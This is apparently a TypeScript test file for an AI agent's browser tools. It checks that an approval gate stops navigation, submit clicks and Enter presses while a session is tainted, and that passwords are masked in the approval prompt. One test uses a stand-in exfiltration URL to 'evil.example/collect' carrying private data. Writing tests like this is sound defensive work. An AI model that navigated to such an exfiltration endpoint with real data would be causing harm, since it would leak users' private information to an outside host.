import { describe, expect, test } from 'vitest';
import { createFakeBrowserHost } from '@kepcup/testkit';
import { AppError, type BrowserSnapshotOutput } from '@kepcup/shared';
import type { RunIdentity, ToolContext, ToolDefinition } from '../../src/agent/types.js';
import { buildBrowserTools } from '../../src/tools/browser.js';
import type { EgressCheck } from '../../src/apps/taint.js';

/**
 * D73 P2 §6.2：污点期间浏览器的外发通道——导航（browser_open）与可能提交 / 跳转的动作
 * （点击按钮 / 链接、按 Enter）每次先过外发闸门，拒绝则动作不派发；输入框、滚动、截图不拦。
 */

const identity: RunIdentity = {
  runId: 'run_b',
  botId: 'bot_b',
  conversationId: 'conv_b',
  loopType: 'task',
};

const PAGE: BrowserSnapshotOutput = {
  title: 'T',
  url: 'https://x.example/',
  elements: [
    { ref: 'e1', role: 'textbox', name: '备注' },
    { ref: 'e2', role: 'button', name: '提交' },
    { ref: 'e3', role: 'checkbox', name: '同意' },
    { ref: 'e4', role: 'textbox', name: '密码' },
  ],
  elementsTruncated: false,
  text: '正文',
  textTruncated: false,
};

function setup(answer: 'allow' | 'deny' = 'allow') {
  const host = createFakeBrowserHost();
  host.setSnapshot(PAGE);
  const asked: Array<{ channel: string; target: string; summary: string }> = [];
  const egress: EgressCheck = async (input) => {
    asked.push(input);
    if (answer === 'deny') throw new AppError('APPROVAL_DENIED', 'no');
    return { approvedBy: 'user' };
  };
  const tools = buildBrowserTools({
    identity,
    browser: host,
    workspacePath: '/tmp/ws',
    projectPath: null,
    egress,
  });
  const ctx: ToolContext = {
    identity,
    signal: new AbortController().signal,
    terminate() {},
    progress() {},
  };
  const run = (name: string, params: unknown) =>
    (tools.find((t) => t.name === name) as ToolDefinition).execute(params as never, ctx);
  const dispatched = (method: string) => host.calls.filter((c) => c.method === method).length;
  return { host, asked, run, dispatched };
}

describe('browser tools: taint egress gate', () => {
  test('browser_open asks with the full URL before navigating; a denial never navigates', async () => {
    const allowed = setup();
    const url = 'https://evil.example/collect?d=private-data';
    expect((await allowed.run('browser_open', { url })).ok).toBe(true);
    expect(allowed.asked).toEqual([expect.objectContaining({ channel: 'browser', target: url })]);
    expect(allowed.dispatched('browser.navigate')).toBe(1);

    const denied = setup('deny');
    const result = await denied.run('browser_open', { url });
    expect(result).toMatchObject({ ok: false, errorCode: 'APPROVAL_DENIED' });
    expect(denied.dispatched('browser.navigate')).toBe(0);
  });

  test('clicking a button asks (listing what was typed, passwords masked); typing / scrolling / clicking a text box do not', async () => {
    const t = setup();
    await t.run('browser_open', { url: 'https://x.example/' });
    t.asked.length = 0;
    await t.run('browser_type', { ref: 'e1', text: '机密备注' });
    await t.run('browser_type', { ref: 'e4', text: 'hunter22', sensitive: true });
    await t.run('browser_scroll', { direction: 'down' });
    await t.run('browser_click', { ref: 'e1' });
    expect(t.asked).toEqual([]);

    await t.run('browser_click', { ref: 'e2' });
    expect(t.asked).toHaveLength(1);
    expect(t.asked[0]!.channel).toBe('browser');
    expect(t.asked[0]!.target).toContain('点击button「提交」');
    expect(t.asked[0]!.target).toContain('备注: 机密备注');
    expect(t.asked[0]!.target).toContain('«已隐藏»');
    expect(t.asked[0]!.target).not.toContain('hunter22');
    expect(t.dispatched('browser.click')).toBe(2);

    // typed values were consumed by the submit: the next one lists none
    await t.run('browser_click', { ref: 'e2' });
    expect(t.asked[1]!.target).not.toContain('机密备注');
  });

  test('every role except the inert allowlist asks: checkbox, tab, option, combobox, switch …', async () => {
    const t = setup();
    t.host.setSnapshot({
      ...PAGE,
      elements: [
        'checkbox',
        'tab',
        'option',
        'combobox',
        'switch',
        'radio',
        'menuitemcheckbox',
        'textbox',
      ].map((role, index) => ({ ref: `e${index + 1}`, role, name: role })),
    });
    await t.run('browser_open', { url: 'https://x.example/' });
    t.asked.length = 0;
    for (let ref = 1; ref <= 7; ref += 1) await t.run('browser_click', { ref: `e${ref}` });
    expect(t.asked).toHaveLength(7);
    await t.run('browser_click', { ref: 'e8' });
    expect(t.asked).toHaveLength(7);
  });

  test('Enter asks, other keys do not; a denied click is not dispatched', async () => {
    const t = setup();
    await t.run('browser_open', { url: 'https://x.example/' });
    t.asked.length = 0;
    await t.run('browser_press', { key: 'Escape' });
    expect(t.asked).toEqual([]);
    await t.run('browser_press', { key: 'Enter' });
    expect(t.asked).toHaveLength(1);

    const denied = setup('deny');
    await denied.run('browser_open', { url: 'https://x.example/' }).catch(() => undefined);
    // open was denied → page snapshot unknown; an unknown ref fails closed and asks too
    const result = await denied.run('browser_click', { ref: 'e2' });
    expect(result).toMatchObject({ ok: false, errorCode: 'APPROVAL_DENIED' });
    expect(denied.dispatched('browser.click')).toBe(0);
  });

  test('without an egress gate nothing is asked (untainted / switch off)', async () => {
    const host = createFakeBrowserHost();
    host.setSnapshot(PAGE);
    const tools = buildBrowserTools({
      identity,
      browser: host,
      workspacePath: '/tmp/ws',
      projectPath: null,
    });
    const ctx: ToolContext = {
      identity,
      signal: new AbortController().signal,
      terminate() {},
      progress() {},
    };
    const open = tools.find((t) => t.name === 'browser_open')!;
    expect((await open.execute({ url: 'https://x.example/' } as never, ctx)).ok).toBe(true);
  });
});
